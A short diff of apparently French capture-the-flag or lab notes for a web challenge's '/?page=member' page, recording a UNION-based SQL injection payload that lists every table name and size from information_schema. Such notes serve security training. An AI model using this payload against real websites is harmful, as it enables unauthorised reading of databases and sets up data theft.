@@ -1,4 +1,4 @@
-Go to '/?page=member' page
+Go to '/?page=member'
 
 1 AND 1=0 UNION SELECT table_name, DATA_LENGTH FROM information_schema.tables;
 	=> Nous donne le nom de toutes le tables et de leurs tailles
